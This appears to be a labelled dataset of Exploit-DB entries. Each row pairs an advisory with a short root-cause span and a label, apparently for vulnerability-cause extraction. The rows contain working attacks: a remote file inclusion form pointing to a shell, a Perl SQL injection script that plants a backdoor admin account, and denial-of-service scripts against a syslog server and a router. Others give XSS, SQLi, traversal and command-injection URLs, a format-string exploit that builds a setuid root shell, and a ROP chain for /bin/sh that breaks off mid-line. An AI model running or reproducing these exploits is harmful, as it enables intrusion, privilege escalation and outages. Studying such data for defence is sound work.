32078,"Community CMS 0.1 - 'include.php' Remote File Inclusion source: https://www.securityfocus.com/bid/30275/info  Community CMS is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker can exploit this issue to execute malicious PHP code in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  Community CMS 0.1 is vulnerable; other versions may also be affected.   <?php /************************************************** ******************** *[+] << IN THE NAME OF GOD >> *[+] *[+] *[+] [ Persian Boys Hacking Team ] -:- 2008 -:- IRAN *[+] - *[+] - discovered by N3TR00T3R [at] Y! [dot] com *[+] - communitycms-0.1 Remote File Includion *[+] - download :http://sourceforge.net/project/showf...roup_id=223968 *[+] - sp tnx : Sp3shial,Veroonic4,God_Master_hacker,a_reptil,Ciph 3r,shayan_cmd *[+] r00t.master,Dr.root,Pouya_server,Spyn3t,LordKouros h,123qwe,mr.n4ser *[+] Zahacker,goli_boya,i_reza_i,programer, and all irchatan members ... *[+] ************************************************** ********************/ #if register_globals = On;  $shell=""http://localhost/syn99.php?""; // your shell $target=""http://localhost/communitycms/include.php""; //vul page ---> include.php echo""<html> <body> <form action=$target method=POST> SECURITY :<input type=text name=security> SHELL :<input type=text name=root> <input type=hidden name=security value=1> <input type=hidden name=root value=$shell> <input type=submit value=ok> </form> </body> </html>""; ?>",fails to sufficiently sanitize user-supplied data,1
17115,"ZO Tech Multiple Print Servers - Cross-Site Scripting GotGeek Labs http://www.gotgeek.com.br/  ZO Tech Multiple Print Servers Cross-site Scripting Vulnerability    [+] Description  (1) PA101 Fast Parallel Port Print Server (2) PU201 Fast USB Print Server (3) PA301 Parallel Port Print Server (4) PS531 USB & Parallel Print Server    [+] Information  Title: ZO Tech Multiple Print Servers Cross-site Scripting Vulnerability Shodan Dork: ZOT-PS-30/8.3.0016 -WWW-Authenticate              ZOT-PS-47/9.8.0016 -WWW-Authenticate              ZOT-PS-34/8.3.0019 -WWW-Authenticate              ZOT-PS-39/6.3.0007 -WWW-Authenticate Advisory: gg-009-2011 Date: 03-15-2011 Last update: 03-26-2011 Link: http://www.gotgeek.com.br/pocs/gg-009-2011.txt    [+] Vulnerabilities  Stored Cross-site Scripting: Web interface from PA101, PU201, PA301 and PS531 Print Servers are affected by stored cross-site scripting vulnerability because it fails to properly sanitize user-supplied input at ""NDSContext"" field in ""NetWare NDS Settings"" area. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.  After injecting the XSS code, you need to access Netware status page.   Affected Versions:  ZO Tech PA101 Fast Parallel Port Print Server Firmware: 8.03.30F 0016 (ZOT-PS-30/8.3.0016)           8.03.30F 0014 (ZOT-PS-30/8.3.0014)           8.03.30F 0011 (ZOT-PS-30/8.3.0011)           8.03.30F 0009 (ZOT-PS-30/8.3.0009)           8.03.30F 0008 (ZOT-PS-30/8.3.0008)           8.03.30F 0007 (ZOT-PS-30/8.3.0007)  ZO Tech PU201 Fast USB Print Server Firmware: 9.08.47F 0016 (ZOT-PS-47/9.8.0016)           9.08.47F 0015 (ZOT-PS-47/9.8.0015)           6.03.35F 0008 (ZOT-PS-35/6.3.0008)           6.03.35F 0006 (ZOT-PS-35/6.3.0006)           6.03.35F 0004 (ZOT-PS-35/6.3.0004)           6.03.35F 0003 (ZOT-PS-35/6.3.0003)  ZO Tech PA301 Parallel Port Print Server Firmware: 8.03.34F 0019 (ZOT-PS-34/8.3.0019)           8.03.34F 0016 (ZOT-PS-34/8.3.0016)           8.03.34F 0015 (ZOT-PS-34/8.3.0015)           8.03.34F 0011 (ZOT-PS-34/8.3.0011)           8.03.34F 0008 (ZOT-PS-34/8.3.0008)           8.03.34F 0007 (ZOT-PS-34/8.3.0007)  ZO Tech PS531 USB & Parallel Print Server Firmware: 6.03.39F 0007 (ZOT-PS-39/6.3.0007)           6.03.39F 0006 (ZOT-PS-39/6.3.0006)           6.03.39F 0005 (ZOT-PS-39/6.3.0005)           6.03.39F 0003 (ZOT-PS-39/6.3.0003)  Other versions may also be vulnerable.    [+] Proof of Concept/Exploit  XSS: http://target/RESTART.HTM?NDSContext=</script><script>alert(""xss"")</script><script>  and then..  http://target/NETWARE.HTM    [+] Timeline  24-03-2011: first contact to vendor. 03-04-2011: no vendor response. 04-04-2011: advisory published.    [+] References  (1)http://www.zot.com.tw/Product/Product_Detail.asp?ProductID=98 (2)http://www.zot.com.tw/Product/Product_Detail.asp?ProductID=99 (3)http://www.zot.com.tw/Product/Product_Detail.asp?ProductID=118 (4)http://www.zot.com.tw/Product/Product_Detail.asp?ProductID=128    [+] Credits  b0telh0","fails to properly sanitize user-supplied input at ""NDSContext"" field in ""NetWare NDS Settings"" area.",1
42411,"Solarwinds Kiwi Syslog 9.6.1.6 - Denial of Service # Exploit Title: Solarwinds Kiwi Syslog 9.6.1.6 - Remote Denial of Service (Type Mismatch) # Date: 26/05/2017 # Exploit Author: Guillaume Kaddouch #   Twitter: @gkweb76 #   Blog: https://networkfilter.blogspot.com #   GitHub: https://github.com/gkweb76/exploits # Vendor Homepage: http://www.solarwinds.com/ # Software Link: http://downloads.solarwinds.com/solarwinds/Release/Kiwi/Syslog/Kiwi-Syslog-Server-9.6.1-Eval.zip # Version: 9.6.1.6 # Tested on: Windows 7 SP1 Family x64 (FR) and Windows 8.1 Pro x64 # Category: DoS  """""" Disclosure Timeline: -------------------- 2017-05-20: Vulnerability discovered 2017-05-26: Vendor contacted 2017-05-31: Vendor answered (technical support) 2017-05-31: Vendor contacted (no answer) 2017-08-01: Exploit published   Description : ------------- A remote Denial of Service exists in Kiwi Syslog 9.6.1.6 in the TCP listener. Apparently any data sent to it make it crash because of a Type Mismatch error. The syslog TCP listener is disabled by default.   Instructions: ------------- - Starts Kiwi Syslog, and enable the TCP listener in the settings, default port is 1468. - Run this exploit locally or from your remote attacking machine. """"""  #!/usr/bin/python import socket  host    = ""10.0.0.56"" port    = 1468  buffer  = ""crash please?""  try:         print ""[*] Connecting to %s:%d"" % (host, port)         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         s.connect((host, port))          print ""[*] Sending buffer... (%d bytes)"" % len(buffer)         s.send(buffer)         s.close()          print ""[*] Done."" except:         print ""[-] Error connecting""",a Type Mismatch error,1
34864,"Epicor Enterprise 7.4 - Multiple Vulnerabilities ""Epicor Enterprise vulnerabilities""  - Affected vendor: Epicor Software Corporation - Affected system: Epicor Enterprise - Version 7.4 - Vendor disclosure date: May 13th, 2014 - Public disclosure date: September 30th, 2014 - Status: Fixed  - Associated CVEs:      1) CVE-2014-4311   Password values not masked appropriately:   Even though the application appears to be masking the affected password values in the database connection and email settings page, it is possible to access their content by observing the HTML code.      Affected password values:   - “Database Connection”   - “E-mail Connection”    Associated CAPEC:   CAPEC-167: Lifting Sensitive Data from the Client - https://capec.mitre.org/data/definitions/167.html      Associated CWE:   CWE-200: Information Exposure - http://cwe.mitre.org/data/definitions/200.html      2) CVE-2014-4312   Persistent and reflective cross-site scripting (XSS) attacks possible:   The identified website is vulnerable to persistent and reflective cross-site scripting. Script injection is a weakness within an application, and is due to insufficient validation of the input data (i.e. input data being sent from the user/presentation layer) and output encoding allowing dynamic execution of scripts on the application front end resulting in anomalous/abnormal behaviour of the application.      Example of affected functionalities for persistent XSS:    - 1. While viewing Order details, and injecting a malicious payload on the ""Notes"" section.    - 2. While modifying an “Order to consume” and injecting a malicious payload on the ""Description"" section.    - 3. While observing the “Favorites” section and and injecting a malicious payload on the “Favorites name” section.      Example of an injected payload: <script>alert(""XSS"")</script>      Example of affected URLs for reflective XSS:   - 1. https://XXXXX/Procurement/EKPHTML/search_item_bt.asp?RecordsRequested=Yes&FiltPartNo=&FiltSupplier=-1&FiltKeyword=<script>alert(""XSS"")</script>   - 2. https://XXXXX/Procurement/EKPHTML/EnterpriseManager/Budget/ImportBudget_fr.asp?Act=dtt""><script>alert(""XSS"")</script>   - 3. https://XXXXX /Procurement/EKPHTML/EnterpriseManager/UserSearchDlg.asp?hdnPageName=UserSearch&hdnOpenerFormName=PrefApp&hdnApproverFieldName=temp1&hdnApproverIDFieldName=temp2&hdnUserID=200&hdnOpener=Test""><script>alert(""XSS"")</script>   - 4. https://XXXXX/Procurement/EKPHTML/EnterpriseManager/UserSearchDlg.asp?hdnOpenerFormName=PrefApp&hdnApproverFieldName=""><script>alert(""XSS"")</script>   - 5. https://XXXXX/Procurement/EKPHTML/EnterpriseManager/Codes.asp?INTEGRATED=XSS"">--><script>alert(""XSS"")</script>    Associated CAPEC:   CAPEC-32: Embedding Scripts in HTTP Query Strings - https://capec.mitre.org/data/definitions/32.html      Associated CWE:   CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') - http://cwe.mitre.org/data/definitions/79.html  - Available fix:   Epicor Enterprise Hotfix: FS74SP6_HotfixTL054181   - Credit:   These vulnerabilities were discovered by Fara Rustein.   If you have any questions, comments, concerns, updates or suggestions please contact Fara Rustein (TW: @fararustein).",insufficient validation of the input data (i.e. input data being sent from the user/presentation layer) and output encoding,1
24298,"Internet Software Sciences Web+Center 4.0.1 - Cookie Object SQL Injection source: https://www.securityfocus.com/bid/10771/info  An SQL injection vulnerability is identified in the application that may allow attackers to pass malicious input to database queries, resulting in the modification of query logic or other attacks.   This issue exists due to insufficient sanitization of user-supplied input through the Cookie object.  Successful exploitation could result in compromise of the application, disclosure or modification of data or may permit an attacker to exploit vulnerabilities in the underlying database implementation. An attacker may gain access to the administrative username and password and execute arbitrary database commands as well.  Web+Center version 4.0.1 is affected by this vulnerability. Other versions may be affected as well.  #!/usr/bin/perl  use IO::Socket; use strict;  my $host = $ARGV[0]; my $Path = $ARGV[1];  if (($#ARGV+1) < 2) { print ""iss_helpdesk.pl host path\n""; exit(0); }  my $remote = IO::Socket::INET->new ( Proto => ""tcp"", PeerAddr => $host, PeerPort => ""80"" );  unless ($remote) { die ""cannot connect to http daemon on $host"" }  my $sql = ""; INSERT INTO tech_staff (tech_id, tech_password, tech_level, first_name, last_name, availability, show_dispatch_flag) VALUES ('Hacked', 'Hacked', 6, 'Hacked', 'Hacked', 1, 1); --"";  $sql =~s/([^a-zA-Z0-9])/uc sprintf(""%%%02x"",ord($1))/eg;  my $http = ""GET /$Path/search.asp HTTP/1.1 Host: $host User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Connection: close Cookie: ISS_TECH_CENTER_LOGIN='+$sql;  "";  print ""HTTP: [$http]\n""; print $remote $http; sleep(1);  while (<$remote>) { # print $_; } print ""\n"";  close($remote);  print ""You can now logon using the tech username 'Hacked' with the password 'Hacked'\n"";  exit(0);",insufficient sanitization of user-supplied input through the Cookie object,1
22419,"PHP 4.3 - 'socket_iovec_alloc()' Integer Overflow source: https://www.securityfocus.com/bid/7187/info  A vulnerability has been reported in PHP versions 4.3.1 and earlier. The problem occurs in the socket_iovec_alloc() and may allow an attacker to corrupt memory. Specifically, the affected function fails to carry out sanity checks on user-supplied argument values, making it prone to an integer overflow.  This may make it possible for an attacker to trigger a denial of service. Although it has not been confirmed, it may also be possible to exploit this issue to execute arbitrary code.  It should be noted that socket functionality is only included in PHP if compiled with the ""--enable-sockets"" option.  <?php socket_iovec_alloc(0x20000000); ?>",the affected function fails to carry out sanity checks on user-supplied argument values,1
30607,"bcoos 1.0.10 Arcade Module - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/25790/info  The 'bcoos' Arcade module is prone to an SQL-injection vulnerability because it fails to adequately sanitize user-supplied input before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  This issue affects bcoos Arcade module 1.0.10; other versions may also be affected.   http://www.example.com/modules/arcade/index.php?act=play_game&gid=[SQL]",fails to adequately sanitize user-supplied input before using it in an SQL query,1
38784,Alienvault Open Source SIEM (OSSIM) - 'Timestamp' Directory Traversal source: https://www.securityfocus.com/bid/62899/info  Open Source SIEM (OSSIM) is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.  Exploiting this issue can allow an attacker to gain access to arbitrary system files. Information harvested may aid in launching further attacks.  Open Source SIEM (OSSIM) 4.3.3 is vulnerable; other versions may also be affected.   http://www.example.com/ossim/ocsreports/tele_compress.php?timestamp=../../../../etc/ossim,fails to sufficiently sanitize user-supplied input,1
29047,Hot Links - Perl PHP Information Disclosure source: https://www.securityfocus.com/bid/21112/info  Hot Links is prone to an information-disclosure vulnerability because it fails to authenticate the user during specific download requests.  An attacker can exploit this issue to retrieve administrative backup files. Information obtained may aid in further attacks.  All versions of Hot Links SQL-PHP and Hot Links Pro are vulnerable; other forks may also be affected.  http://www.example.com/[path]/dlback.php?dl=fullback,fails to authenticate the user during specific download requests,1
6499,"Advanced Electron Forum 1.0.6 - Remote Code Execution ########################################################## # GulfTech Security Research           September 20, 2008 ########################################################## # Vendor : Electron Inc. # URL : http://www.anelectron.com/ # Version : AEF Forum <= 1.0.6 # Risk : Remote Code Execution ##########################################################    Description: Advanced Electron Forum also known as AEF Forum is a full featured online forum system written in php that allows webmasters and site owners to host their own discussion forums within their website. The Advanced Electron Forum software comes bundled with the popular MKPortal package, but is also available as a free stand alone forum. Unfortunately there are multiple remote code execution issues within AEF that allow for an attacker to execute arbitrary php code with privileges of the affected webserver. This is due to the improper handling of evaluated bbcode within AEF Forum. Users should upgrade their forums as soon as possible.    Remote Code Execution: There is a serious security issue within AEF Forums that allows for forum users to easily execute arbitrary php code on the affected webserver. This issue is due to AEF Forums sending wildcard matches to the replacement parameter of preg_replace function, within double quotes, while the eval switch is present. Below is one of the many examples of the security issues within the bbcode handling of AEF.  //Email Links if($globals['bbc_email']){      $text = preg_replace(                 array(""/\[email=(.*?)\](.*?)\[\/email\]/ies"",                         ""/\[email\](.*?)\[\/email\]/ies""),                 array('check_email(""$1"", ""$2"")',                         'check_email(""$1"", ""$1"")'), $text);  }  As we can see from the above code, a wildcard match is used to gather the matches sent to replacement parameter for evaluation. This is bad because an attacker can use complex variable syntax within an [email] tag (other tags are also vulnerable) and have it executed as php code.  [email]{${phpinfo()}}[/email]  If the above bb code was posted to a vulnerable AEF Forum then the php within the tags would be executed. In this case the php code is simply a phpinfo() call, but of course, other attacks are possible.    Solution: Thanks to Jim Haslip for his help with communicating this issue to developers. Users should upgrade as soon as possible.    Credits: James Bercegay of the GulfTech Security Research Team    Related Info: The original advisory can be found at the following location http://www.gulftech.org/?node=research&article_id=00131-09202008   # milw0rm.com [2008-09-20]",the improper handling of evaluated bbcode within AEF Forum,1
28852,"ONO Hitron CDE-30364 Router - Denial of Service #!/usr/bin/python  #----------------------------------------------------------------------------------------- #Description: #----------------------------------------------------------------------------------------- #Hitron Technologies CDE-30364 is a famous ONO Router.   #The Hitron Technologies CDE-30364's web interface (listening on tcp/ip port 80), have a problem to insufficient bounds checking of data supplied in HTTP GET requests. The default ip adress of this adsl router, used for management purpose, is 192.168.1.1.   import httplib import socket import time import sys   print ""\n###########################################################################################################"" print ""# Exploit Title: Router ONO Hitron CDE-30364 - Denial Of Service(80 port)                                 #"" print ""# Date: 8-10-2013                                                                                         #"" print ""# Exploit Author: Matias Mingorance Svensson - matias.ms[at]owasp.org                                     #"" print ""# Vendor Homepage: http://www.ono.es/clientes/te-ayudamos/dudas/internet/equipos/hitron/hitron-cde-30364/ #"" print ""# Tested on: Hitron Technologies CDE-30364                                                                #"" print ""# Version HW: 1A                                                                                          #"" print ""# Version SW: 3.1.0.8-ONO                                                                                 #"" print ""###########################################################################################################\n""   #Send Request print ""Sending the request to router ONO Hitron CDE-30364...\n"" connct = httplib.HTTPConnection(sys.argv[1],80) connct.request(""GET"", ""AAAAAAAAAA""*10001) connct.close()  #Check 80 port s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) time.sleep(5) try:  s.connect((sys.argv[1], 80))  s.shutdown(2)  print ""Attack Fail!\n"" except:  print ""Attack Successful! The router administration page is down!\n""",insufficient bounds checking of data supplied in HTTP GET requests,1
31383,"PHP-Nuke NukeC30 3.0 Module - 'id_catg' SQL Injection source: https://www.securityfocus.com/bid/28197/info  The NukeC30 module for PHP-Nuke is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  The NukeC30 module 3.0 is affected; other versions may also be vulnerable.   http://www.example.com/modules.php?name=NukeC30&op=ViewCatg&id_catg=-1/**/union/**/select/**/concat(aid,0x3a,pwd),2/**/from/**/nuke_authors/*where%20admin%20-2",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
32645,"TWiki 4.x - 'SEARCH' Remote Command Execution source: https://www.securityfocus.com/bid/32668/info  TWiki is prone to a vulnerability that attackers can leverage to execute arbitrary commands in the context of the application. This issue occurs because the application fails to adequately sanitize user-supplied input.  Successful attacks can compromise the affected application and possibly the underlying computer.   Enter the following in the application's search box: %SEARCH{ date=""P`pr -?`"" search=""xyzzy"" }%  http://www.example.com/twiki/bin/view/Main/WebSearch?search=%25SEARCH%7Bdate%3D%22P%60pr+-%3F%60%22+search%3D%22xyzzy%22%7D%25&scope=all",the application fails to adequately sanitize user-supplied input,1
35089,"Joomla! Component Jeformcr - 'id' SQL Injection source: https://www.securityfocus.com/bid/45329/info  Joomla Jeformcr is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_jeformcr&view=form&id=[SQLi]",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
24611,"YaBB 1.x/9.1.2000 - Administrator Command Execution source: https://www.securityfocus.com/bid/11214/info  It is reported that YaBB is affected by an administrator command execution vulnerability. This issue is due to a failure of the application to properly validate access to administrative commands.  This issue permits a remote attacker to create a malicious URI link or embed a malicious URI between IMG tags, which includes hostile YaBB administrative commands. If an unsuspecting forum administrator views a post that contains this IMG tag, they will inadvertently activate the malicious URI, the attacker-supplied command is carried out with the administrator's privileges.  <img>http://www.example.com/YaBB.pl?board=;action=modifycat;id=CATEGORYNAMEHERE;moda=Remove2</img>",a failure of the application to properly validate access to administrative commands,1
20604,"Debian 2.2 / Su.S.E 6.3/6.4/7.0 - man '-l' Format String source: https://www.securityfocus.com/bid/2327/info  man is the manual page viewing program, available with the Linux Operating System in this implementation. It is freely distributed and openly maintained.  A problem with the man command may allow for the elevation of privileges. Due to the handling of format strings by the -l argument of the man command, it may be possible for a local user to pass format strings through the man command, which could allow a user to write to a specific address in the stack and overwrite variables, including the return address of functions on the stack. man, as implemented with some distributions of the Linux operating system, is included as an SUID root binary.  It may be possible for a malicious user with local access to execute arbitrary code on the stack, and potentially gain elevated privileges, including administrative access.   #!/bin/bash  #	CONFIGURATION: umask 000 target=""/usr/bin/man"" tmpdir=""/tmp/manexpl"" rm -rf ""$tmpdir""  #       address we want to write to (ret on the stack) #       has to be an absolute address but we brute force #		this scanning 64 addresses from writeadr on writeadr=""0xbffff180""  #       address of the shell in our string #		must point somewhere to our 'nop' region shadr=""0xbffff720""  #	number of nops before shellcode declare -i nnops nnops=128  #	brute force how many times declare -i nbrute nbrute=512   echo echo ""-------------------------------------------"" echo ""|           local man exploit             |"" echo ""|              by IhaQueR                 |"" echo ""|    only for demonstrative purposes      |"" echo ""-------------------------------------------"" echo  echo echo ""configured for running $target"" echo echo ""RETADR = $writeadr"" echo ""SHELL  = $shadr"" echo ""NOPS   = $nnops"" echo  shellfake=""SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"" nop=""N""  #	prepare mkdir -p ""$tmpdir"" if ! test -d ""$tmpdir"" ; then 	echo ""[-] creating working dir, exit"" 	exit 1 fi;  echo ""[+] created working dir"" cd ""$tmpdir"" echo  #	number of nops before shellcode declare -i nnops nnops=128  #	make nop field declare -i idx idx=0  nopcode="""" head=""""  while test $idx -lt $nnops; do 	nopcode=""${nop}$nopcode"" 	idx=$(($idx+1)) done;   #	sanity check :-) if ! test -x $target ; then 	echo ""[-] $target not found or not executable, sorry"" 	exit 1 fi;  echo ""[+] found $target"" echo  #	get uids muid=$(id -u man) ruid=$(id -u) if ! test $muid="""" || ! test $ruid="""" ; then 	echo ""[-] error checking ids, sorry"" 	exit 2; fi;  printf ""[+] uid=%d\t\tmid=%d"" $ruid $muid echo  declare -i cnt declare -i cntmax cnt=0  #	max gstring length*4 cntmax=1024   #	make string used for offset search #	like <head><addr><nops><shellcode> #	PP stands for padding hstring=""%0016d%x%0016d%d%0016d%d%0016d%dABCDEEEEFFFFGGGGHHHHIIIIJJJJKKKK${nopcode}${shellfake}"" gstring=""""  #	find offset echo ""    now searching for offset"" echo  declare -i npad declare -i ocnt ocnt=0  while test $cnt -le $cntmax ; do 	if test $ocnt -eq 4 ; then 		ocnt=0 		echo 	fi;  	gstring=""%16g$gstring"" 	cnt=$(($cnt+1)) 	npad=0 	padding=""""  	printf ""[%4d "" $cnt  	while test $npad -lt 8 ; do 		echo -n "" $npad"" 		result=$($target -l ""$gstring$hstring"" -p ""$padding"" a 2>&1 | grep ""44434241"") 		if test ""$result"" != """" ; then 			break 2; 		fi; 		padding=""P$padding"" 		npad=$(($npad+1)) 	done;  	echo -n "" ]   "" 	ocnt=$(($ocnt+1)) done  echo ""]  "" echo echo  #	found offset declare -i offset offset=$(($cnt * 4))  if test $cnt -gt $cntmax ; then 	echo ""[-] offset not found, please tune me :-)"" 	exit 2 fi;  echo ""[+] OFFSET found to be $offset/$cnt pad=$npad""   #	number of bytes written so far declare -i nwrt nwrt=$((16*${cnt}))  echo ""    now constructing magic string nwrt=$nwrt"" echo  #	we need unsigned arithmetics, simple c tool cat <<__ATOOL__> atool.c  #include <stdio.h>  int main(int argc, char** argv) { int i, flip; unsigned adr, shadr, nwrt, ruid, muid; unsigned char* p; unsigned addr[9]; unsigned char head[33]=""%0016d%x%0016d%x%0016d%x%0016d%x""; unsigned char nop[1024]; unsigned char buf[8192];  //		IhaQueR's special code (no trojan, believe me :-) char hellcode[]=	""\x31\xc0\x31\xdb\x31\xc9"" 					""\xb1\x01\xb7\x02\xb3\x03"" 					""\xb0\x46\xcd\x80"" 					""\x31\xc0\x31\xdb\x31\xc9"" 					""\xb3\x01\xb5\x02\xb1\x03"" 					""\xb0\x46\xcd\x80"" 					""\x31\xc0\x31\xdb"" 					""\xb3\x01\xb0\x17\xcd\x80"" 					""\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"" 					""\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd""    					""\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff./mkmsh"";   //		correct hellcode for current ruid, muid 		ruid = $ruid; 		muid = $muid; 		hellcode[7] = muid & 0xff; 		hellcode[9] = (ruid >> 8 ) & 0xff; 		hellcode[11] = ruid & 0xff; 		hellcode[23]=hellcode[7]; 		hellcode[25]=hellcode[9]; 		hellcode[27]=hellcode[11]; 		hellcode[37]=hellcode[7];  		adr = $writeadr; 		adr += atol(argv[1]);  //		address field 		for(i=0; i<4; i++) { 			addr[2*i] = adr + i; 			addr[2*i+1] = adr + i; 		} 		addr[8]=0;  //		head 		shadr = $shadr; 		nwrt = $nwrt + 0; 		p = (unsigned char*)&shadr; 		for(i=0; i<4; i++) { 			flip = (((int)256) + ((int)p[i])) - ((int)(nwrt % 256)); 			nwrt = nwrt + flip; 			sprintf(head+i*8, ""%%%04dx%%n"", flip); 		} 		head[32] = 0;  //		nops 		for(i=0; i<$nnops; i++) 			nop[i] = 0x90; 		nop[i] = 0;  		sprintf(buf, ""$target -l '%s%s%s%s%s' -p \""$padding\"" a 2>&1"", ""$gstring"", head, addr, nop, hellcode); 		system(buf); } __ATOOL__  #	helper apps rm -f atool gcc atool.c -o atool if ! test -x atool ; then 	echo ""[-] compilation error, exiting"" 	exit 3 fi;  echo ""[+] compiled address tool""  #	mansh cat <<__MANSH__> mansh.c main(int argc, char** argv) { 	setreuid($muid, $ruid); 	execv(""/bin/sh"", argv); } __MANSH__  rm -rf mansh rm -rf umansh gcc mansh.c -o umansh if ! test -x umansh ; then 	echo ""[-] compilation error, exiting"" 	exit 4 fi;  echo ""[+] compiled mansh""  #	mkmsh cat <<__MKMSH__> mkmsh #!/bin/bash cp umansh mansh chmod u+s mansh __MKMSH__ chmod a+x mkmsh  if ! test -x mkmsh ; then 	echo ""[-] compilation error, exiting"" 	exit 5 fi;  echo ""[+] mkmsh ready""   #	brute force echo ""    now brute force, wait..."" echo  idx=0 ocnt=1 umask 022  while test $idx -lt $nbrute ; do 	result=$(atool ""$(($idx*4))"") 	if test -x mansh ; then 		echo 		echo 		echo ""[+] SUCCESS"" 		echo 		echo ""    suid man shell at $tmpdir/mansh"" 		echo 		exit 6 	fi; 	printf ""[%4d] "" $idx 	if test $ocnt -eq 16 ; then 		ocnt=0; 		echo 	fi; 	idx=$(($idx+1)) 	ocnt=$(($ocnt+1)) done;  #	cleanup echo echo ""[-] FAILED, tune writeadr, shadr, nnops, nbrute, etc."" echo echo rm -rf ""$tmpdir""  --------------60A11DEE53A9281CA54089A7--",the handling of format strings by the -l argument of the man command,1
45288,"SIPP 3.3 - Stack-Based Buffer Overflow # Exploit Author: Juan Sacco <jsacco@exploitpack.com> - http://exploitpack.com # # Tested on: Kali i686 GNU/Linux # # Description: SIPP 3.3 is prone to a local unauthenticated stack-based overflow # The vulnerability is due to an unproper filter of user suppliedinput while reading # the configuration file and parsing the malicious crafted value. # # Program: SIPP 3.3 Traffic generator for the SIP protocol # SIPp is a free Open Source test tool / traffic generator # for the SIP protocol. Filename: pool/main/s/sipp/sipp_3.3-1kali2_i386.deb # # Vendor: http://sipp.sourceforge.net/ # gdb-peda$ checksec # CANARY    : disabled # FORTIFY   : disabled # NX        : ENABLED # PIE       : ENABLED # RELRO     : Partial # #[----------------------------------registers-----------------------------------] # EAX: 0x41414141 ('AAAA') # EBX: 0x25 ('%') # ECX: 0xb7c9e340 --> 0x4cf8b0 ('A' <repeats 200 times>...) # EDX: 0xb7c9e200 --> 0x0 # ESI: 0xb7ca0748 --> 0x0 # EDI: 0x0 # EBP: 0xbfffc898 --> 0xbfffc8c8 --> 0xbfffc8e8 --> 0xbfffc908 -->0xb7c9d000 --> 0x1d4d6c # ESP: 0xbfffc898 --> 0xbfffc8c8 --> 0xbfffc8e8 --> 0xbfffc908 -->0xb7c9d000 --> 0x1d4d6c # EIP: 0x43cdcf (mov    eax,DWORD PTR [eax+0xc]) # EFLAGS: 0x10216 (carry PARITY ADJUST zero sign trap INTERRUPTdirection overflow) # [-------------------------------------code-------------------------------------] #   0x43cdc2: call   0x4053e6 #   0x43cdc7: add    eax,0x50239 #   0x43cdcc: mov    eax,DWORD PTR [ebp+0x8] # => 0x43cdcf: mov    eax,DWORD PTR [eax+0xc] #   0x43cdd2: pop    ebp #   0x43cdd3: ret #   0x43cdd4: push   ebp #   0x43cdd5: mov    ebp,esp # [------------------------------------stack-------------------------------------] # 0000| 0xbfffc898 --> 0xbfffc8c8 --> 0xbfffc8e8 --> 0xbfffc908 -->0xb7c9d000 --> 0x1d4d6c # 0004| 0xbfffc89c --> 0x43c159 (add    esp,0x10) # 0008| 0xbfffc8a0 (""AAAA\377\377\377\377\310\310\377\277C\301C"") # 0012| 0xbfffc8a4 --> 0xffffffff # 0016| 0xbfffc8a8 --> 0xbfffc8c8 --> 0xbfffc8e8 --> 0xbfffc908 -->0xb7c9d000 --> 0x1d4d6c # 0020| 0xbfffc8ac --> 0x43c143 (add    eax,0x50ebd) # 0024| 0xbfffc8b0 --> 0x597ba0 --> 0x0 # 0028| 0xbfffc8b4 --> 0xffffffff # [------------------------------------------------------------------------------] # Legend: code, data, rodata, value # Stopped reason: SIGSEGV # 0x41414141 in ?? ()  import os, subprocess from struct import pack  # rop execve ( bin/sh ) rop = ""A""*2208 # junk rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; pop edi; pop ebp ; ret rop += pack('<I', 0x0811abe0) # @ .data rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x0807b744) # pop eax ; ret rop += '/bin' rop += pack('<I', 0x0810ae08) # mov dword ptr [edx], eax ; pop ebx ;pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; popedi ;pop ebp ; ret rop += pack('<I', 0x0811abe4) # @ .data + 4 rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x0807b744) # pop eax ; ret rop += '//sh' rop += pack('<I', 0x0810ae08) # mov dword ptr [edx], eax ; pop ebx ;pop ebp ; ret rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x080e9101) # pop edx ; pop ebx ; pop esi ; pop edi; pop ebp ; ret rop += pack('<I', 0x0811abe8) # @ .data + 8 rop += pack('<I', 0x41414141) # padding rop += pack('<I', 0x41414141) # padding rop += pack('<I', 